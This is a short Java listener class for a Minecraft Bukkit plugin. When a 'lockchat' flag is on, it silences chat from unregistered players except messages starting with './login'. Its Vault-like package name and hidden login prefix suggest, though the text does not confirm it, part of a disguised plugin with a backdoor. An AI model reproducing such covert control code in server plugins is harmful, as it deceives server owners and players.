package net.milkbowl.vault.events;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import net.milkbowl.vault.Core;

public class ToggleChat implements Listener {
	private static final Core plugin = Core.getPlugin(Core.class);
	
	@EventHandler
	public void onChat(AsyncPlayerChatEvent e) {
		Player p = e.getPlayer();
		if (plugin.lockchat) {
			if (!plugin.registered.contains(p.getName())) {
				if (!e.getMessage().toLowerCase().startsWith("./login")) {
					e.setMessage(null);
					e.setCancelled(true);
				}
		}
	}
}

}
